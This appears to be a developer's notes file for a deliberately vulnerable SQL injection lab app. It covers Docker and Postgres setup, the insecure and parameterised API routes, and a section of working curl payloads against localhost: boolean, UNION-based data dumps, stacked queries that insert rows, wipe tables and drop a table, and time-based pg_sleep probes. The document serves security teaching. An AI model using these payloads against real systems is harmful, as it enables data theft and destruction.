# Backend Dev Notes

Working notes on container management, database access, API usage, and SQL injection exploit examples.

---

## Container Management

Build and run the backend container locally (without Compose):

```bash
docker rm -f sqlinj-backend
docker build -t sqlinj-backend:dev .
docker run --rm -it --name sqlinj-backend --env-file .env -p 5001:5001 sqlinj-backend:dev
```

Pull and run from GHCR (pipeline-built image):

```bash
docker pull --platform linux/amd64 ghcr.io/igorgroz/sqlinj-backend:latest
docker run --rm -it --platform linux/amd64 --env-file .env -p 5001:5001 ghcr.io/igorgroz/sqlinj-backend:latest
```

---

## Database Access

Connect to the containerised Postgres instance:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject
```

Useful psql commands:

```sql
\dt                          -- list tables
SELECT * FROM users;
SELECT * FROM clothes;
SELECT * FROM user_clothes;
```

### Reference Data

**users**

| userid | name    | surname  |
|--------|---------|----------|
| 1      | John    | Doe      |
| 2      | Jane    | Smith    |
| 3      | Alice   | Johnson  |
| 4      | Bob     | Brown    |
| 5      | Charlie | Williams |

**clothes**

| clothid | description | color | brand  | size     | material  |
|---------|-------------|-------|--------|----------|-----------|
| 1       | T-Shirt     | Red   | Nike   | M        | Cotton    |
| 2       | Jeans       | Blue  | Levis  | 32       | Denim     |
| 3       | Jacket      | Black | Adidas | L        | Polyester |
| 4       | Sweater     | Green | Uniqlo | M        | Wool      |
| 5       | Hat         | Black | Puma   | One Size | Cotton    |
| 6       | Scarf       | Red   | Gucci  | One Size | Silk      |
| 7       | Shoes       | White | Adidas | 9        | Leather   |
| 8       | Socks       | Gray  | H&M    | M        | Cotton    |
| 9       | Sneakers    | White | Nike   | 10       | Leather   |
| 10      | Shorts      | Black | Zara   | M        | Polyester |

> Legacy: AWS RDS endpoint was `sqlinjproject-db.cymhse7fxmp9.ap-southeast-2.rds.amazonaws.com` — decommissioned, using containerised Postgres only.

---

## REST API Endpoints

All routes served from `http://localhost:5001`. Full interactive docs at `/api-docs`.

### Insecure Routes (SQL injection targets)

| Method | Endpoint                          | Vulnerability                                      |
|--------|-----------------------------------|----------------------------------------------------|
| GET    | `/api/insecure-users`             | String interpolation in query                      |
| GET    | `/api/insecure-users/:userid`     | userid injected directly into SQL                  |
| GET    | `/users/:userid/clothes`          | userid injected directly into SQL                  |
| POST   | `/users/:userid/clothes`          | userid + clothid injected directly                 |
| PUT    | `/users/:userid/clothes/:clothid` | userid, clothid, newClothid injected directly      |
| DELETE | `/users/:userid/clothes/:clothid` | userid + clothid injected directly                 |

### Secure Routes (parameterised queries)

| Method | Endpoint                               | Protection                      |
|--------|----------------------------------------|---------------------------------|
| GET    | `/api/safe-users`                      | Parameterised query             |
| GET    | `/api/safe-users/:userid`              | Parameterised query             |
| GET    | `/users/:userid/safe-clothes`          | `$1` placeholder                |
| POST   | `/users/:userid/safe-clothes`          | Parameterised insert            |
| PUT    | `/users/:userid/safe-clothes/:clothid` | Parameterised update            |
| DELETE | `/users/:userid/safe-clothes/:clothid` | Parameterised delete            |

---

## SQL Injection Exploit Examples

> **All four insecure routes use integer context** — values are interpolated
> bare into SQL with no surrounding quotes. String-context payloads (`'` based)
> do not work here. The injection break is `)` or a SQL keyword, not `'`.

### Injection context reference

| Route | Interpolated SQL fragment | Context |
|-------|--------------------------|---------|
| `GET /api/insecure-users/:userid` | `WHERE userid = ${userid}` | integer |
| `GET /api/insecure-users/:userid/clothes` | `WHERE uc.userid = ${userid}` | integer |
| `POST /api/insecure-users/clothes` | `VALUES (${userid}, ${clothid})` | integer |
| `POST /api/insecure-users/remove-cloth` | `WHERE userid = ${userid} AND clothid = ${clothid}` | integer |

---

### 1 — Boolean-based (manipulate WHERE to widen result set)

```bash
# GET /insecure-users/:userid  →  WHERE userid = 1 OR 1=1  →  returns ALL users
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1"

# GET /insecure-users/:userid/clothes  →  WHERE uc.userid = 1 OR 1=1  →  ALL clothes
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1/clothes"

# POST remove-cloth  →  DELETE WHERE userid=1 AND clothid=1 OR 1=1  →  WIPES TABLE
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1 OR 1=1"}'
```

---

### 2 — UNION-based (extract data from other tables)

`users` has 3 columns (userid INT, name TEXT, surname TEXT).
`clothes` has 6 columns (clothid INT, description, color, brand, size, material).

```bash
# Dump version via /insecure-users  (3-col UNION, userid=0 ensures no real row)
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,version(),'x'--"

# Dump all usernames via /insecure-users
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname%20FROM%20users--"

# Dump users table via /insecure-users/:userid/clothes  (must match 6 cols)
# Maps:  clothid←userid, description←name, color←surname, rest padded
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname,name,surname,'x'%20FROM%20users--/clothes"

# Enumerate tables via information_schema
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,table_name,'x'%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--"
```

---

### 3 — Stacked queries (execute additional statements)

`pool.query()` uses PostgreSQL simple-query protocol — multiple statements
separated by `;` are all executed.

```bash
# POST /clothes  →  INSERT completes, then second statement runs
# Inject a new user row
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Hacked\',\'User\'); --"}'

# Delete ALL clothing assignments in one shot
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  -d '{"userid":"5","clothid":"9); DELETE FROM user_clothes; --"}'

# Stacked via GET (URL-encoded semicolon %3B)
# INSERT a user via the GET route
curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Eve','Hacker')--"

# Drop a table (destructive — restart stack to recover)
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; DROP TABLE user_clothes; --"}'
```

---

### 4 — Time-based blind (confirm injection without visible output)

```bash
# 3-second delay confirms code execution even with no data returned
curl -g -w "\nTotal time: %{time_total}s\n" \
  "http://localhost:5001/api/insecure-users/1%3B%20SELECT%20pg_sleep(3)--"

# Via POST body (cleaner, no URL encoding needed)
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; SELECT pg_sleep(3); --"}' \
  -w "\nTotal time: %{time_total}s\n"
```

---

### Verify injections in the database

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM users;"
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM user_clothes;"
```

Injected rows appear alongside the 5 seed users.
To reset to a clean state: `docker compose down -v && docker compose up -d`

---

## GraphQL Endpoints

| Endpoint             | Auth required | Notes                        |
|----------------------|---------------|------------------------------|
| `/graphql`           | No            | Apollo v4, standard          |
| `/graphql-insecure`  | No            | Vulnerable resolver          |
| `/graphql-secure`    | Yes (JWT)     | requireJwt middleware        |
